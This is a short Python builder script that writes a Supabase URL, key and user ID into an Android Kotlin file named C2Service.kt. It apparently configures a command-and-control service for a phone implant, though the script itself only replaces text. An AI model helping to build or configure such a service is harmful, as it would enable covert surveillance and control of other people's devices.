import argparse

def replace_in_file(filepath, placeholders):
    with open(filepath, 'r', encoding='utf-8') as f:
        content = f.read()
    for key, value in placeholders.items():
        content = content.replace(key, str(value))
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(content)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--supabase_url', required=True)
    parser.add_argument('--supabase_key', required=True)
    parser.add_argument('--user_id', required=True)
    args = parser.parse_args()

    kotlin_path = "android_base/app/src/main/java/com/sys/service/C2Service.kt"
    replace_in_file(kotlin_path, {
        "YOUR_SUPABASE_URL": args.supabase_url,
        "YOUR_SUPABASE_KEY": args.supabase_key,
        "YOUR_USER_ID": args.user_id
    })
    print("[+] Configuration injected successfully!")
